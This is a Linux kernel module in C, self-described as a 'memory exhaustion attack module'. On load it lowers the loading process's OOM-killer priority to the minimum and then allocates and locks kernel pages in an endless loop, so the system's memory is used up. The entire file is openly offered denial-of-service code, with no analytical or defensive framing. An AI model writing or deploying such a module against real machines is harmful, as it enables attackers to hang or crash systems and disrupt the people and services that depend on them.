#include <linux/module.h>
#include <linux/gfp.h>
#include <linux/oom.h>

static int __init memhog_init(void){
    struct page *page;
    
    // Bypass OOM killer adjustments
    current->signal->oom_score_adj = OOM_SCORE_ADJ_MIN;
    
    while(1) {
        page = alloc_pages(GFP_KERNEL | __GFP_NOFAIL, 0);
        if (!page) break;
        
        // Prevent pages from being freed
        __SetPageLocked(page);
    }
    
    return 0;
}

module_init(memhog_init);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Memory exhaustion attack module");
